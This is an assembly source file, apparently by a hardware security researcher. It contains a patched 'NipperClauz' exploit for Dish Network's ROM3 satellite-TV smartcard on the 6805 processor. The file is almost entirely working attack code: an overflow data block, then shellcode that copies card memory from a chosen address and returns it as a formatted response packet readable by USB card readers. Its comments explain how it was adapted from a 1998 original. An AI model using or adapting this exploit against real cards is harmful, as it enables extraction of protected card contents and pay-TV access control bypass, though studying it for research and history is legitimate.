;;; Patched NipperClauz exploit for Dish Network's ROM3 card.
;;; Travis Goodspeed, 2022

	.lang 6805

	.db 0x01, 0x02, 0x03, 0xa4, 0x05, 0x06, 0x07, 0x08,
	.db 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	.db 0x11, 0x02, 0x03, 0x04, 0x0a, 0x06, 0x07, 0x08,
	.db 0x59, 0x5A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	.db 0xc1, 0x02, 0x03, 0xd4, 0x05, 0x06, 0x07, 0xc8,
	.db 0x29, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	.db 0x31, 0xd2, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
	.db 0x39, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	.db 0x41, 0x02, 0x03, 0xd4, 0x05, 0x06, 0x07, 0x08,
	.db 0x49, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	.db 0x51, 0x02, 0x03, 0x04, 0x05, 0x06, 0xe7, 0x08,
	.db 0x59, 0x0A, 0x0a, 0x0C, 0x0a, 0x0E, 0x0F, 0x10,
	.db 0x61, 0x02, 0x03, 0x04, 0x00, 0x01, 0x02, 0x03,
	.db 0x04, 0x05, 0x0b, 0x07, 0x08, 0x09, 0x0A, 0x0B,
	.db 0x0C, 0x0D, 0x0E, 0x0F, 0x00, 0xf1, 0x02, 0x03,
	.db 0x04, 0x05, 0xe6, 0x07, 0x08, 0x09, 0x0A, 0x0B,
	.db 0x0C, 0xfD, 0x0c, 0x0F, 0x00, 0x01, 0x02, 0x03,
	.db 0x05, 0x0A, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B,
	.db 0x0C, 0x0D, 0x0E, 0x0F, 0x01, 0x01, 0x01, 0x00,
	.db 0x00, 0x00, 0xFF, 0x07, 0x52, 0x56, 0x73, 0x03,
	.db 0xCD, 0xDC, 0x34, 0xC3,

;;; Rather than dump the data directly out to the serial port
;;; as the NipperClauz and Headend exploits do, this shellcode
;;; instead returns a properly formatted packet of just 32 bytes.
;;; This wasn't needed for serial port adapters in 1998, but it's
;;; necessary for USB readers in 2022.

	;; Entry point for our shellcode.
	nop
	nop
	nop
	nop

	;; Data begins at 0x19C+2
	ldx #0x21
	nop
	nop

loop:
	lda @0xffff, x          ; 0xffff replaced with source address.
	sta @0x01a1, x          ; 0x01a1 is target address in SRAM.
	dec x
	bpl loop

	nop

        ;; Call respondax(0x93, 0x40) to transmit packet.
	lda #0x93		; Response code 0x93.
	ldx #0x40		; Length in bytes.
	.equ respondax 0x757f
	jsr @respondax		; Send response.

	;; These three bytes will be clobbered.  Don't rely on them.
	.db 0, 0, 0
	;; These bytes set the entry point of 0x0060.
	.db 0x00, 0x00, 0x00, 0x60
	
